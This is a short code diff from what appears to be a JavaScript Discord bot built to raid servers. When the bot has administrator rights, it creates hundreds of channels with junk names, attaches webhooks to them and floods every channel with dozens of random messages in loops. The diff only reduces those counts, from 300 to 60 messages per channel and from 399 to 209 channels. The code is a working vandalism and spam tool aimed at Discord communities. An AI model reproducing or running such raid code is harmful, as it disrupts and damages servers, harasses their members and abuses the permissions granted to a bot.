@@ -241,7 +241,7 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
             
             })
             var spam = 0
-            while(spam < 300) 
+            while(spam < 60) 
         {    
             p.send(randomT())
             spam++
@@ -260,7 +260,7 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
             
             })
             var spam = 0
-            while(spam < 300) 
+            while(spam < 60) 
         {    
             p.send(randomT())
             spam++
@@ -279,7 +279,7 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
                
                })
                var spam = 0
-               while(spam < 300) 
+               while(spam < 60) 
            {    
                p.send(randomT())
                spam++
@@ -298,13 +298,13 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
                 
                 })
                 var spam = 0
-                while(spam < 300) 
+                while(spam < 60) 
             {    
                 p.send(randomT())
                 spam++
             }
              })
-        while(number < 399) {
+        while(number < 209) {
              msg.guild.channels.create('【❒】【❒】【❒】【❒】【❒】【❒】【❒】【❒】【❒】【❒】【❒】【❒】【❒】【❒】【❒】【❒】【❒】').then(c => { 
                 
                  c.createWebhook("assy").then(w => {
@@ -318,7 +318,7 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
                  })
              
              var spam = 0
-             while(spam < 300) 
+             while(spam < 60) 
          {    
              c.send(randomT())
              spam++
